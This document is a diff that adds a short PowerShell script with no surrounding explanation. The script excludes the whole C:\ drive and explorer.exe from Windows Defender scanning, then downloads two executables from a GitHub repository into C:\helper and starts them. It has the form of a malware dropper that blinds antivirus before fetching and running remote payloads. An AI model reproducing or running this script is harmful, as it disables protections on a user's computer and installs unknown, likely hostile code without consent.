@@ -1,0 +1,9 @@
+Add-MpPreference -ExclusionPath "C:\" ; Add-MpPreference -ExclusionProcess "explorer.exe" ; start-sleep 5 ;
+
+wget "https://github.com/othermeinthenightcontrol2/1/raw/refs/heads/main/q.exe" -o C:\helper\q.exe ; start-sleep 2 ;
+start-process C:\helper\q.exe ;
+
+wget "https://github.com/othermeinthenightcontrol2/1/raw/refs/heads/main/sm.exe" -o C:\helper\sm.exe ; start-sleep 2 ;
+start-process C:\helper\sm.exe ;
+
+echo regex.exe > C:\helper\regex.exe ; 
